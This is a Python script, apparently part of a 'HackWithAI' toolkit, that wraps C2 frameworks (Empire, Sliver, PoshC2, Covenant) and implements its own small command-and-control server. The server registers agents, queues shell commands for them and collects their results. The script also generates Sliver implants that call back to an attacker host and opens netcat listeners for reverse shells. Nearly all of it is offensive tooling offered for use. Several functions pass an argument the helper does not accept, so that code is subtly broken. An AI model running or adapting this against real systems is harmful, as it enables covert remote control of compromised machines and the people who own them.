#!/usr/bin/env python3
"""C2 Framework Tools — Empire, Sliver, Covenant, PoshC2, Mythic, Custom C2"""

import subprocess, json, sys, base64, socket, threading, os
from pathlib import Path
from typing import List, Dict, Optional

OUTPUT_DIR = Path("/home/kali/HackWithAI/data/c2")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def _run(cmd: List[str], timeout: int = 300) -> dict:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"ok": r.returncode == 0, "stdout": r.stdout, "stderr": r.stderr, "rc": r.returncode}
    except FileNotFoundError:
        return {"ok": False, "error": f"Tool not found: {cmd[0]}"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "Timeout"}

# ── Custom C2 Server ─────────────────────────────────────────────────────
class CustomC2:
    """Minimal C2 server with HTTP listener, agent registration, and task dispatch."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        self.host = host
        self.port = port
        self.agents: Dict[str, Dict] = {}
        self.tasks: Dict[str, List[str]] = {}
        self.server: Optional[socket.socket] = None

    def start(self):
        """Start the C2 HTTP listener."""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[C2] Listening on {self.host}:{self.port}")
        while True:
            try:
                client, addr = self.server.accept()
                threading.Thread(target=self._handle_agent, args=(client, addr), daemon=True).start()
            except KeyboardInterrupt:
                break
        self.server.close()

    def _handle_agent(self, client: socket.socket, addr):
        try:
            data = client.recv(4096).decode(errors="ignore")
            request = data.split("\r\n")[0] if data else ""

            if "POST /register" in request:
                agent_id = f"agent_{len(self.agents)}"
                self.agents[agent_id] = {"addr": addr[0], "last_seen": __import__("time").time()}
                self.tasks[agent_id] = []
                response = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n" + agent_id.encode()
            elif "GET /task" in request:
                agent_id = request.split("?id=")[-1].split(" ")[0] if "?id=" in request else ""
                tasks = self.tasks.get(agent_id, [])
                task = tasks.pop(0) if tasks else "sleep 5"
                if agent_id in self.agents:
                    self.agents[agent_id]["last_seen"] = __import__("time").time()
                response = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n" + task.encode()
            elif "POST /result" in request:
                body = data.split("\r\n\r\n")[-1] if "\r\n\r\n" in data else ""
                print(f"[C2] Result: {body[:500]}")
                response = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nOK"
            else:
                response = b"HTTP/1.1 404 Not Found\r\n\r\n"

            client.send(response)
        except Exception as e:
            print(f"[C2] Error: {e}")
        finally:
            client.close()

    def add_task(self, agent_id: str, command: str):
        if agent_id in self.tasks:
            self.tasks[agent_id].append(command)

    def list_agents(self) -> Dict:
        return {aid: {"addr": a["addr"], "last_seen": a["last_seen"]}
                for aid, a in self.agents.items()}


# ── Empire ───────────────────────────────────────────────────────────────
def empire_start(host: str = "0.0.0.0", port: int = 1337) -> dict:
    return _run(["python3", "/opt/Empire/empire.py", "--headless",
                 "--rest", "--username", "empireadmin", "--password", "empireadmin",
                 "--port", str(port)], timeout=10, capture=False)

# ── Sliver ────────────────────────────────────────────────────────────────
def sliver_start_daemon() -> dict:
    return _run(["sliver-server", "daemon"], timeout=10, capture=False)

def sliver_generate(lhost: str, lport: int, os_target: str = "linux",
                    arch: str = "amd64", fmt: str = "executable") -> dict:
    return _run(["sliver", "generate", "--os", os_target, "--arch", arch,
                 "--format", fmt, "--lhost", lhost, "--lport", str(lport),
                 "--save", str(OUTPUT_DIR)])

# ── PoshC2 ───────────────────────────────────────────────────────────────
def poshc2_create_project(name: str) -> dict:
    return _run(["posh-project", "-n", name])

def poshc2_start(project: str) -> dict:
    return _run(["posh-server", "-p", project], timeout=10, capture=False)

# ── Covenant ─────────────────────────────────────────────────────────────
def covenant_start() -> dict:
    return _run(["dotnet", "run", "--project", "/opt/Covenant/Covenant"],
                timeout=10, capture=False)

# ── HTTP Listener (quick) ────────────────────────────────────────────────
def http_listener(port: int = 8080) -> dict:
    """Start a simple HTTP listener for testing callbacks."""
    return _run(["python3", "-m", "http.server", str(port)], timeout=10, capture=False)

def netcat_listener(port: int) -> dict:
    return _run(["nc", "-lvnp", str(port)], timeout=10, capture=False)

# ── CLI ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "help"
    if cmd == "listen":   print(f"Starting C2 listener on port {sys.argv[2] if len(sys.argv)>2 else 8080}")
    elif cmd == "c2":     c2 = CustomC2(); c2.start()
    elif cmd == "sliver": print(json.dumps(sliver_generate(sys.argv[2], int(sys.argv[3]))))
    elif cmd == "nc":     netcat_listener(int(sys.argv[2]) if len(sys.argv) > 2 else 4444)
    else: print("Commands: listen <port> | c2 | sliver <lhost> <lport> | nc <port>")
